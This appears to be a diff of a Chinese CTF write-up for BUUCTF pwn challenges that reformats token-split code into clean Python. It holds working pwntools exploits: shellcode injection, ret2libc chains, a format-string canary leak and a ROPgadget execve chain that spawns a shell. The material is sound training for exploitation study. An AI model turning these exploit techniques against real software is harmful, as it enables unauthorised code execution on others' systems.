-#前面的crashme\x00绕过if判断
-
-
-#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址
-
-pause
-()
-
-p
-.
-sendline
-(
-payload
-)
-
-pause
-()
-
+pause()
+p.sendline(payload)
+pause()
 ```
 
 `0x8048600`是一个`nop`指令的地址，在这里下一个断点，方便调试
@@ -2811,32 +538,7 @@ pause
 
 
 ```
-
-payload
-
-=
-
-b
-'crashme
-\x00
-'
-+
-b
-'a'
-*
-(
-0x16
--
-8
-+
-4
-)
-+
-p32
-(
-addr
-)
-
+payload = b'crashme\x00'+b'a'*(0x16-8+4)+p32(addr)
 ```
 
 > crashme\x00占8个字节减去，ebp占4个字节要覆盖
@@ -2852,161 +554,28 @@ addr
 最后得到exp
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
 #elf = ELF("./pwn")
-
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
 
-def
+p=remote('node5.buuoj.cn',26858)
+p.recvuntil('crash: ')
+stack_addr=int(p.recv(10),16)
+shellcode=asm(shellcraft.sh())
 
-dbg
-():
+payload=b'crashme\x00'+b'a'*(0x16-8+4)+p32(stack_addr-0x1c)+shellcode
+p.sendline(payload)
 
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-p
-=
-remote
-(
-'node5.buuoj.cn'
-,
-26858
-)
-
-p
-.
-recvuntil
-(
-'crash: '
-)
-
-stack_addr
-=
-int
-(
-p
-.
-recv
-(
-10
-),
-16
-)
-
-shellcode
-=
-asm
-(
-shellcraft
-.
-sh
-())
-
-payload
-=
-b
-'crashme
-\x00
-'
-+
-b
-'a'
-*
-(
-0x16
--
-8
-+
-4
-)
-+
-p32
-(
-stack_addr
--
-0x1c
-)
-+
-shellcode
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+p.interactive()
 ```
 
 
@@ -3015,276 +584,30 @@ interactive
 64位的\*\*\*`ret2libc`\*\*\*从栈传参变成了寄存器传参
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-*
-
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-28910
-)
-
+```python
+from pwn import *
+from LibcSearcher import *
+p = remote('node5.buuoj.cn',28910)
 #p=process('./pwn')
+elf = ELF('./pwn')
+rdi_add = 0x4006b3
+rsir15_add = 0x4006b1
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+vul_add = elf.symbols['vulnerable_function']
 
-elf
-
-=
-
-ELF
-(
-'./pwn'
-)
-
-rdi_add
-
-=
-
-0x4006b3
-
-rsir15_add
-
-=
-
-0x4006b1
-
-write_plt
-
-=
-
-elf
-.
-plt
-[
-'write'
-]
-
-write_got
-
-=
-
-elf
-.
-got
-[
-'write'
-]
-
-vul_add
-
-=
-
-elf
-.
-symbols
-[
-'vulnerable_function'
-]
-
-payload
-
-=
-
-b
-'a'
-*
-0x80
-
-+
-
-b
-'a'
-*
-0x8
-
-payload1
-=
-payload
-+
-p64
-(
-rdi_add
-)
-+
-p64
-(
-0x1
-)
-+
-p64
-(
-rsir15_add
-)
-+
-p64
-(
-write_got
-)
-+
-b
-'deadbeef'
-+
-p64
-(
-write_plt
-)
-+
-p64
-(
-vul_add
-)
-
-p
-.
-recvuntil
-(
-"Input:
-\n
-"
-)
-
-p
-.
-sendline
-(
-payload1
-)
-
-write_addr
-
-=
-
-u64
-(
-p
-.
-recvuntil
-(
-b
-'
-\x7f
-'
-)[
--
-6
-:]
-.
-ljust
-(
-8
-,
-
-b
-'
-\x00
-'
-))
-
-libc
-=
-LibcSearcher
-(
-'write'
-,
-write_addr
-)
-
-libc_base
-=
-write_addr
--
-libc
-.
-dump
-(
-'write'
-)
-
-sys_add
-
-=
-
-libc_base
-
-+
-
-libc
-.
-dump
-(
-'system'
-)
-
-binsh_add
-
-=
-libc_base
-+
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-payload2
-
-=
-
-payload
-
-+
-
-p64
-(
-rdi_add
-)
-
-+
-
-p64
-(
-binsh_add
-)
-
-+
-
-p64
-(
-sys_add
-)
-
-p
-.
-sendline
-(
-payload2
-)
-
-p
-.
-interactive
-()
-
+payload = b'a'*0x80 + b'a'*0x8
+payload1=payload+p64(rdi_add)+p64(0x1)+p64(rsir15_add)+p64(write_got)+b'deadbeef'+p64(write_plt)+p64(vul_add)
+p.recvuntil("Input:\n")
+p.sendline(payload1)
+write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+libc=LibcSearcher('write',write_addr)
+libc_base=write_addr-libc.dump('write')
+sys_add = libc_base + libc.dump('system')
+binsh_add =libc_base+libc.dump('str_bin_sh')
+payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)
+p.sendline(payload2)
+p.interactive()
 ```
 
 
@@ -3295,125 +618,23 @@ interactive
 ida没法反编译了，这次读汇编（其实只要传入shellcode就行）
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',26947)
+def dbg():
+    gdb.attach(p)
+    pause()
 
-p
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-26947
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-shellcode
-
-=
-
-asm
-(
-shellcraft
-.
-sh
-())
-
-p
-.
-sendline
-(
-shellcode
-)
-
-p
-.
-interactive
-()
-
+shellcode = asm(shellcraft.sh())
+p.sendline(shellcode)
+p.interactive()
 ```
 
 接下来看一下汇编
@@ -3422,19 +643,15 @@ interactive
 
 
 ```
-
 buf= byte ptr -410h ;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置
 var_4= dword ptr -4 ;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置
-
 ```
 
 
-```
-
+```asm
 push    rbp
 mov     rbp, rsp
 sub     rsp, 410h
-
 ```
 
 这里是开辟0x410字节空间的栈
@@ -3442,26 +659,22 @@ sub     rsp, 410h
 中间一部分应该是缓冲区设置，没看懂，但也不需要看懂，跳过
 
 
-```
-
+```asm
 lea     rdi, s          ; "Show me your magic!"
 call    _puts
-
 ```
 
 - `lea rdi, s`：将字符串 `"Show me your magic!"` 的地址加载到 `rdi` 寄存器中，作为 `_puts` 函数的参数。
 - `call _puts`：调用 `_puts` 函数输出字符串，并自动添加换行符。
 
 
-```
-
+```asm
 lea     rax, [rbp+buf]
 mov     edx, 400h       ; nbytes
 mov     rsi, rax        ; buf
 mov     edi, 0          ; fd
 mov     eax, 0
 call    _read
-
 ```
 
 - `lea rax, [rbp+buf]`：计算相对于基指针 `rbp` 偏移量为 `-410h` 的内存地址，并将其加载到 `rax` 寄存器中，作为读取数据的缓冲区地址。
@@ -3472,12 +685,10 @@ call    _read
 - `call _read`：调用 `_read` 函数从标准输入读取最多 `400h` 字节的数据到缓冲区中。
 
 
-```
-
+```asm
 mov     [rbp+var_4], eax
 cmp     [rbp+var_4], 0
 jg      short loc_11D6
-
 ```
 
 - `mov [rbp+var_4], eax`：将 `_read` 函数的返回值（实际读取的字节数）保存到相对于基指针 `rbp` 偏移量为 `-4` 的内存位置（var\_4)
@@ -3487,11 +698,9 @@ jg      short loc_11D6
 **若失败，即无读入（左边）**
 
 
-```
-
+```asm
 mov     eax, 0
 jmp     short locret_11E4
-
 ```
 
 - `mov eax, 0`：将寄存器 `eax` 赋值为 0。在很多系统调用和函数返回中，`eax` 通常用于存储返回值，这里将其置为 0 表示程序以正常状态退出或者操作失败的返回码。
@@ -3500,13 +709,11 @@ jmp     short locret_11E4
 **若成功，即有读入（右边）**
 
 
-```
-
+```asm
 loc_11D6:                               ; CODE XREF: main+78↑j
 lea     rax, [rbp+buf]
 call    rax
 mov     eax, 0
-
 ```
 
 - `loc_11D6`：这是一个代码标签，当满足 `jg` 跳转条件时会跳转到这里。
@@ -3524,362 +731,45 @@ mov     eax, 0
 我记得写过canary绕过的wp，忘了在哪了，再写一份吧
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',26391)
+def dbg():
+    gdb.attach(p)
+    pause()
+put_plt=elf.plt['puts']
+put_got=elf.got['puts']
+pop_rdi=0x0400993
+main_addr=elf.symbols['main']
+vuln_addr=0x400887
 
-p
+p.sendlineafter('help u!\n',b'%7$p')
+p.recvuntil(b'0x')
+canary = int(p.recv(16),16)
 
-=
+payload = p64(canary)
+payload = payload.rjust(0x20,b'a')+b'a'*8+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(vul
+n_addr)
+p.sendlineafter(b'story!\n',payload)
+put_addr=u64(p.recv(6).ljust(8,b'\x00'))
 
-remote
-(
-'node5.buuoj.cn'
-,
-26391
-)
+libc=LibcSearcher('puts',put_addr)
+libcbase=put_addr-libc.dump("puts")
+system_addr=libcbase+libc.dump("system")
+binsh_addr=libcbase+libc.dump("str_bin_sh")
 
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-put_plt
-=
-elf
-.
-plt
-[
-'puts'
-]
-
-put_got
-=
-elf
-.
-got
-[
-'puts'
-]
-
-pop_rdi
-=
-0x0400993
-
-main_addr
-=
-elf
-.
-symbols
-[
-'main'
-]
-
-vuln_addr
-=
-0x400887
-
-p
-.
-sendlineafter
-(
-'help u!
-\n
-'
-,
-b
-'%7$p'
-)
-
-p
-.
-recvuntil
-(
-b
-'0x'
-)
-
-canary
-
-=
-
-int
-(
-p
-.
-recv
-(
-16
-),
-16
-)
-
-payload
-
-=
-
-p64
-(
-canary
-)
-
-payload
-
-=
-
-payload
-.
-rjust
-(
-0x20
-,
-b
-'a'
-)
-+
-b
-'a'
-*
-8
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-put_got
-)
-+
-p64
-(
-put_plt
-)
-+
-p64
-(
-vul
-
-n_addr
-)
-
-p
-.
-sendlineafter
-(
-b
-'story!
-\n
-'
-,
-payload
-)
-
-put_addr
-=
-u64
-(
-p
-.
-recv
-(
-6
-)
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-))
-
-libc
-=
-LibcSearcher
-(
-'puts'
-,
-put_addr
-)
-
-libcbase
-=
-put_addr
--
-libc
-.
-dump
-(
-"puts"
-)
-
-system_addr
-=
-libcbase
-+
-libc
-.
-dump
-(
-"system"
-)
-
-binsh_addr
-=
-libcbase
-+
-libc
-.
-dump
-(
-"str_bin_sh"
-)
-
-payload
-
-=
-
-p64
-(
-canary
-)
-
-payload
-
-=
-
-payload
-.
-rjust
-(
-0x20
-,
-b
-'a'
-)
-+
-b
-'a'
-*
-8
-+
-p64
-(
-pop_rdi
-)
-+
-p64
-(
-binsh_addr
-)
-+
-p64
-(
-system_addr
-)
-+
-
-p64
-(
-vuln_addr
-)
-
-p
-.
-sendlineafter
-(
-'story!
-\n
-'
-,
-payload
-)
-
-p
-.
-interactive
-()
-
+payload = p64(canary)
+payload = payload.rjust(0x20,b'a')+b'a'*8+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)+
+p64(vuln_addr)
+p.sendlineafter('story!\n',payload)
+p.interactive()
 ```
 
 **审题**
@@ -3904,36 +794,8 @@ interactive
 
 
 ```
-
-payload
-
-=
-
-p64
-(
-canary
-)
-
-
-# 写入canary值
-
-payload
-
-=
-
-payload
-.
-rjust
-(
-0x20
-,
-b
-'a'
-)
-
-
-# buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节
-
+payload = p64(canary)   # 写入canary值
+payload = payload.rjust(0x20,b'a')  # buf距离rbp为0x20，所以直接将canary和垃圾数据一起填满这32字节
 ```
 
 *后面3就是正常的ret2libc了，都写烂了要，不说了*
@@ -3965,623 +827,64 @@ ida里面一看，`system(dest)`,前面还有一段将`buf`拼接到dest后面�
 `ROPgadget --binary pwn --ropchain`直接可以生成rop链，把溢出填充好就直接用就行
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-LibcSearcher
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'amd64'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #r = process('./pwn')
-
-r
-
-=
-
-remote
-(
-'node5.buuoj.cn'
-,
-29636
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-r
-)
-
-
-pause
-()
+r = remote('node5.buuoj.cn',29636)
+def dbg():
+    gdb.attach(r)
+    pause()
 
 #!/usr/bin/env python3
-
-
 # execve generated by ROPgadget
 
-from
-
-struct
-
-import
-
-pack
-
+from struct import pack
 
 # Padding goes here
-
-p
-
-=
-
-b
-'a'
-*
-0xC
-+
-b
-'b'
-*
-0x4
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0806ecda
-)
-
-
-# pop edx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea060
-)
-
-
-# @ .data
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080b8016
-)
-
-
-# pop eax ; ret
-
-p
-
-+=
-
-b
-'/bin'
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0805466b
-)
-
-
-# mov dword ptr [edx], eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0806ecda
-)
-
-
-# pop edx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea064
-)
-
-
-# @ .data + 4
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080b8016
-)
-
-
-# pop eax ; ret
-
-p
-
-+=
-
-b
-'//sh'
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0805466b
-)
-
-
-# mov dword ptr [edx], eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0806ecda
-)
-
-
-# pop edx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea068
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080492d3
-)
-
-
-# xor eax, eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0805466b
-)
-
-
-# mov dword ptr [edx], eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080481c9
-)
-
-
-# pop ebx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea060
-)
-
-
-# @ .data
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080de769
-)
-
-
-# pop ecx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea068
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0806ecda
-)
-
-
-# pop edx ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080ea068
-)
-
-
-# @ .data + 8
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x080492d3
-)
-
-
-# xor eax, eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0807a66f
-)
-
-
-# inc eax ; ret
-
-p
-
-+=
-
-pack
-(
-'<I'
-,
-
-0x0806c943
-)
-
-
-# int 0x80
-
-r
-.
-sendline
-(
-p
-)
-
-r
-.
-interactive
-()
-
+p = b'a'*0xC+b'b'*0x4
+
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080b8016) # pop eax ; ret
+p += b'/bin'
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea064) # @ .data + 4
+p += pack('<I', 0x080b8016) # pop eax ; ret
+p += b'//sh'
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481c9) # pop ebx ; ret
+p += pack('<I', 0x080ea060) # @ .data
+p += pack('<I', 0x080de769) # pop ecx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x0806ecda) # pop edx ; ret
+p += pack('<I', 0x080ea068) # @ .data + 8
+p += pack('<I', 0x080492d3) # xor eax, eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0807a66f) # inc eax ; ret
+p += pack('<I', 0x0806c943) # int 0x80
+
+r.sendline(p)
+r.interactive()
 ```
 
 
@@ -4590,294 +893,34 @@ interactive
 ***ret2libc***
 
 
-```
-
-from
-
-pwn
-
-import
-
-*
-
-from
-
-LibcSearcher
-
-import
-
-*
-
-from
-
-ctypes
-
-import
-
-*
-
-context
-(
-os
-=
-'linux'
-,
-
-arch
-=
-'i386'
-,
-log_level
-
-=
-
-'debug'
-)
-
-context
-.
-terminal
-
-=
-
-'wt.exe -d . wsl.exe -d Ubuntu'
-.
-split
-()
-
-elf
-
-=
-
-ELF
-(
-"./pwn"
-)
-
+```python
+from pwn import *
+from LibcSearcher import *
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
 #libc = ELF("./libc.so.6")
-
 #p = process('./pwn')
+p = remote('node5.buuoj.cn',28452)
+def dbg():
+    gdb.attach(p)
+    pause()
 
-p
+main = elf.sym['main']
+write_plt = elf.plt['write']
+write_got = elf.got['write']
 
-=
+payload = b'a'*0x88+b'b'*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(0x4)
+p.sendline(payload)
+write_addr = u32(p.recv(4))
+libc = LibcSearcher('write',write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info('libc_base:'+hex(libc_base))
 
-remote
-(
-'node5.buuoj.cn'
-,
-28452
-)
-
-def
-
-dbg
-():
-
-
-gdb
-.
-attach
-(
-p
-)
-
-
-pause
-()
-
-main
-
-=
-
-elf
-.
-sym
-[
-'main'
-]
-
-write_plt
-
-=
-
-elf
-.
-plt
-[
-'write'
-]
-
-write_got
-
-=
-
-elf
-.
-got
-[
-'write'
-]
-
-payload
-
-=
-
-b
-'a'
-*
-0x88
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-write_plt
-)
-+
-p32
-(
-main
-)
-+
-p32
-(
-1
-)
-+
-p32
-(
-write_got
-)
-+
-p32
-(
-0x4
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-write_addr
-
-=
-
-u32
-(
-p
-.
-recv
-(
-4
-))
-
-libc
-
-=
-
-LibcSearcher
-(
-'write'
-,
-write_addr
-)
-
-libc_base
-
-=
-
-write_addr
--
-libc
-.
-dump
-(
-'write'
-)
-
-log
-.
-info
-(
-'libc_base:'
-+
-hex
-(
-libc_base
-))
-
-sys
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'system'
-)
-
-binsh
-
-=
-
-libc_base
-+
-libc
-.
-dump
-(
-'str_bin_sh'
-)
-
-payload
-
-=
-
-b
-'a'
-*
-0x88
-+
-b
-'b'
-*
-0x4
-+
-p32
-(
-sys
-)
-+
-p32
-(
-0
-)
-+
-p32
-(
-binsh
-)
-
-p
-.
-sendline
-(
-payload
-)
-
-p
-.
-interactive
-()
-
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload = b'a'*0x88+b'b'*0x4+p32(sys)+p32(0)+p32(binsh)
+p.sendline(payload)
+p.interactive()
 ```
